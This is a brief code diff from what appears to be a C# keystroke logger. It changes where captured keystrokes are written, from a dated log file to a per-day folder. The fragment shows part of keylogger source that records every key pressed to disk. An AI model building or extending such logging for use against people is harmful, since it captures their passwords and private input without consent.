@@ -56,7 +56,8 @@ namespace key
             Console.WriteLine((Keys)vkCode);
             //string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;\
             API.CreateFolderText();
-            string logNameToWrite = API.FolderText + "/" + API.logName + DateTime.Now.ToLongDateString() + API.logExtendtion;
+            API.CreateFolderDay();
+            string logNameToWrite = API.FolderDay + "/" + API.KeyBoard + API.logExtendtion;
             StreamWriter sw = new StreamWriter(logNameToWrite, true);
             sw.Write((Keys)vkCode);
             sw.Close();
